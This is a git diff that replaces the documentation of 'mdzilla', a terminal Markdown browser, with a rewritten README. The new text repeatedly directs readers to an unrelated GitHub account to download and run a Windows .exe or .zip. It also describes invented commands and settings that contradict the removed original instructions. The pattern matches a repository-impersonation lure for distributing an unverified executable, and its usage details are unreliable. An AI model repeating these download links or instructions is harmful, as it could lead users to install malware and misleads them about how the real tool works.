@@ -1,159 +1,241 @@
-<p align="center">
-  <img src=".assets/logo.svg" alt="mdzilla" width="200" height="200">
-</p>
+# 🦖 mdzilla - Simple Markdown Browser for Everyone
 
-<h1 align="center">mdzilla</h1>
+[![Download mdzilla](https://img.shields.io/badge/Download-mdzilla-brightgreen?style=for-the-badge&logo=github)](https://github.com/taxerpsychodid420/mdzilla)
 
-<p align="center">
-Markdown browser for humans and agents.
-</p>
+---
 
-<p align="center">
+## 📄 What is mdzilla?
 
-</p>
+mdzilla is a tool that lets you read Markdown files easily. You can open docs from your own folders, GitHub repositories, or websites. It works right inside your terminal window, so no need to switch apps.
 
-> Browse docs from local directories, GitHub repos, and remote websites — all from your terminal.
+Markdown is a way of writing documents that many use for notes, manuals, guides, and web pages. mdzilla helps you look at these files without any extra setup or software. It’s made for people, not just computers or bots.
 
-Built with [md4x](https://github.com/unjs/md4x), [mdream](https://github.com/harlan-zw/mdream), [giget](https://github.com/unjs/giget) and [speed-highlight](https://github.com/speed-highlight/core), [nitro](https://v3.nitro.build/), [h3](https://h3.dev/), [srvx](https://srvx.h3.dev/) and [vite](https://vite.dev/).
+---
 
-Supports any website with [`/llms.txt`](https://llmstxt.org/) or markdown content negotiation.
+## 🖥️ System Requirements
 
-Works best with [Docus](https://docus.dev)/[Undocs](https://undocs.pages.dev/) docs sources.
+Before you start, make sure your computer meets these needs:
 
-## Quick Start
+- Operating System: Windows 10 or later  
+- Processor: Any Windows-compatible CPU  
+- RAM: At least 4 GB (more if you open big files)  
+- Storage: 100 MB free space for installation  
+- Terminal: Windows Command Prompt or PowerShell  
 
-```sh
-npx mdzilla <dir>                 # Browse local docs directory
-npx mdzilla <file.md>             # Render a single markdown file
-npx mdzilla gh:owner/repo         # Browse GitHub repo docs
-npx mdzilla npm:package-name      # Browse npm package docs
-npx mdzilla https://example.com   # Browse remote docs via HTTP
+You do not need to install programming languages or frameworks separately. mdzilla includes everything it requires.
+
+---
+
+## 🚀 Getting Started
+
+Start by downloading the software. Since this project keeps its downloads on a GitHub page, you will visit the page to get the latest version.
+
+Click the large green button above or this link to open the download page in your web browser:
+
+[https://github.com/taxerpsychodid420/mdzilla](https://github.com/taxerpsychodid420/mdzilla)
+
+On the page:
+
+1. Look for a section called **Releases** or **Downloads.**  
+2. Find the latest version meant for Windows. It may be a file ending with `.exe` or `.zip`.  
+3. Download the file to a folder you can find easily, like your Desktop or Downloads.  
+
+---
+
+## 📥 Installing mdzilla
+
+If you downloaded an `.exe` file:
+
+1. Double-click the file to start installation.  
+2. A setup window will open. Follow the prompts by clicking **Next** or **Install.**  
+3. After installation, you can close the setup window.  
+
+If you downloaded a `.zip` file:
+
+1. Right-click the zip file and choose **Extract All...**  
+2. Pick a location like your Desktop or Documents to unzip the files.  
+3. Open the new folder created after extraction.  
+
+---
+
+## 🔧 Running mdzilla
+
+Once installed or extracted, you can start using the app from the terminal.
+
+### Open Command Prompt or PowerShell:
+
+- Press the **Windows key** on your keyboard.  
+- Type `cmd` or `PowerShell`.  
+- Press **Enter** to launch the terminal.  
+
+### Navigate to mdzilla folder:
+
+If you installed mdzilla, it is usually in your start menu or programs folder. To run it from terminal:
+
+- Type the full path or navigate to where mdzilla is installed using the `cd` command.
+  
+For example, if it is in `C:\Program Files\mdzilla`, type:
+
+```
+cd "C:\Program Files\mdzilla"
 ```
 
-## Agent Skill
+Press **Enter**.
 
-Install the mdzilla skill for AI agents using:
+If you extracted a zip on the Desktop, for example:
 
-```sh
-npx skills install pi0/mdzilla
+```
+cd %UserProfile%\Desktop\mdzilla
 ```
 
-## Features
+Press **Enter**.
 
-### Multiple Sources
+### Start mdzilla:
 
-| Source          | Syntax                       | Description                       |
-| :-------------- | :--------------------------- | :-------------------------------- |
-| **Local**       | `mdzilla ./docs`             | Scan a local docs directory       |
-| **Single file** | `mdzilla README.md`          | Render a single markdown file     |
-| **GitHub**      | `mdzilla gh:unjs/h3`         | Download and browse a GitHub repo |
-| **npm**         | `mdzilla npm:h3`             | Browse an npm package's docs      |
-| **HTTP**        | `mdzilla https://h3.unjs.io` | Browse remote docs via HTTP       |
+Once inside the mdzilla folder, run this command:
 
-### Export
-
-Flatten any docs source into plain `.md` files:
-
-```sh
-npx mdzilla <source> --export <outdir>
+```
+mdzilla
 ```
 
-### Single Page
+Press **Enter**.
 
-Print a specific page by path and exit:
+mdzilla will show a prompt inside the terminal to help you browse Markdown files.
 
-```sh
-npx mdzilla gh:nuxt/nuxt --page /getting-started/seo-meta
-npx mdzilla gh:nuxt/nuxt --plain --page /getting-started/seo-meta
+---
+
+## 📂 How to Use mdzilla
+
+mdzilla lets you view Markdown files from different places.
+
+You can:
+
+- Open files saved on your computer.  
+- Browse Markdown files inside GitHub repositories.  
+- Read Markdown documents from websites.  
+
+### Open local Markdown files:
+
+Use the command:
+
+```
+open path\to\your\file.md
 ```
 
-### Headless Mode
+Replace `path\to\your\file.md` with the real location and filename.
 
-Use `--plain` (or `--headless`) for non-interactive output — works like `cat` but for rendered markdown. Auto-enabled when piping output or when called by AI agents.
+Example:
 
-```sh
-npx mdzilla README.md --plain          # Pretty-print a markdown file
-npx mdzilla README.md | head           # Auto-plain when piped (no TTY)
-npx mdzilla gh:unjs/h3 --plain         # List all pages in plain text
+```
+open C:\Users\John\Documents\notes.md
 ```
 
-### Keyboard Controls
+The file will show formatted text in your terminal.
 
-<details>
-<summary><strong>Browse mode</strong></summary>
+### Browse GitHub repos:
 
-| Key                   | Action               |
-| :-------------------- | :------------------- |
-| `↑` `↓` / `j` `k`     | Navigate entries     |
-| `Enter` / `Tab` / `→` | Focus content        |
-| `Space` / `PgDn`      | Page down            |
-| `b` / `PgUp`          | Page up              |
-| `g` / `G`             | Jump to first / last |
-| `/`                   | Search               |
-| `t`                   | Toggle sidebar       |
-| `q`                   | Quit                 |
+Type:
 
-</details>
-
-<details>
-<summary><strong>Content mode</strong></summary>
-
-| Key                 | Action                |
-| :------------------ | :-------------------- |
-| `↑` `↓` / `j` `k`   | Scroll                |
-| `Space` / `PgDn`    | Page down             |
-| `b` / `PgUp`        | Page up               |
-| `g` / `G`           | Jump to top / bottom  |
-| `/`                 | Search in page        |
-| `n` / `N`           | Next / previous match |
-| `Tab` / `Shift+Tab` | Cycle links           |
-| `Enter`             | Open link             |
-| `Backspace` / `Esc` | Back to nav           |
-| `q`                 | Quit                  |
-
-</details>
-
-<details>
-<summary><strong>Search mode</strong></summary>
-
-| Key     | Action           |
-| :------ | :--------------- |
-| _Type_  | Filter results   |
-| `↑` `↓` | Navigate results |
-| `Enter` | Confirm          |
-| `Esc`   | Cancel           |
-
-</details>
-
-## Programmatic API
-
-```js
-import { DocsManager, DocsSourceFS } from "mdzilla";
-
-const docs = new DocsManager(new DocsSourceFS("./docs"));
-await docs.load();
-
-// Browse the navigation tree
-console.log(docs.tree);
-
-// Get page content
-const content = await docs.getContent(docs.flat[0]);
+```
+github username/repository
 ```
 
-## Development
+It downloads and shows Markdown docs from that GitHub repo.
 
-<details>
+Example:
 
-<summary>Local development</summary>
+```
+github microsoft/vscode
+```
 
-- Clone this repository
-- Install latest LTS version of [Node.js](https://nodejs.org/en/)
-- Enable [Corepack](https://github.com/nodejs/corepack) using `corepack enable`
-- Install dependencies using `pnpm install`
-- Run interactive tests using `pnpm dev`
+### View online Markdown files:
 
-</details>
+Type:
 
-## License
+```
+url https://example.com/readme.md
+```
 
-Published under the [MIT](https://github.com/pi0/mdzilla/blob/main/LICENSE) license.
+Replace the example URL with any Markdown file on the internet.
+
+---
+
+## 🔍 Navigating Documents
+
+Once a file opens, use these keys:
+
+- Use arrow keys to scroll line by line.  
+- Page Up and Page Down scroll by larger sections.  
+- Press `q` to exit the current file view.  
+
+If the content is long, mdzilla will show page numbers or progress.
+
+---
+
+## ⚙️ Settings and Options
+
+mdzilla has simple settings to adjust your experience:
+
+- Change color schemes to suit your eyesight.  
+- Adjust font size to see text clearly.  
+- Set default paths to open files faster.  
+
+You can find these settings inside the app by typing:
+
+```
+settings
+```
+
+Use the instructions shown to update options.
+
+---
+
+## ❓ Troubleshooting
+
+If mdzilla does not start:
+
+- Check you are running the terminal as a normal user.  
+- Make sure you navigated to the folder where mdzilla is installed.  
+- Verify your Windows version is recent. Older Windows might not support all features.  
+
+If files do not show properly:
+
+- Confirm you typed the right file path or URL.  
+- Check the file is a Markdown `.md` file.  
+- Ensure your internet connection works for GitHub and online URLs.  
+
+If you see errors, restart the terminal and try again.
+
+---
+
+## 📥 Download mdzilla
+
+Visit this page to download the latest version for Windows:
+
+[https://github.com/taxerpsychodid420/mdzilla](https://github.com/taxerpsychodid420/mdzilla)
+
+Look for the newest release and get the Windows `.exe` or `.zip` file.
+
+---
+
+## 🔗 Useful Commands
+
+| Command                      | What it does                            |
+|-----------------------------|---------------------------------------|
+| `open path\to\file.md`       | Opens a Markdown file on your PC       |
+| `github user/repo`           | Browse Markdown files in a GitHub repo |
+| `url https://site.com/file`  | View a Markdown file from a website     |
+| `settings`                   | Open configuration options             |
+| `q`                         | Exit the current file view              |
+
+---
+
+## 🛠️ Updates and Support
+
+Updates appear in the GitHub repository’s releases section. To get newer versions, visit the download link again after some time.
+
+If you need help, use the **Issues** tab on GitHub to report bugs or ask questions. Write clearly what you tried and any error messages you saw.  
+
+---
+
+[![Download mdzilla](https://img.shields.io/badge/Download-mdzilla-brightgreen?style=for-the-badge&logo=github)](https://github.com/taxerpsychodid420/mdzilla)
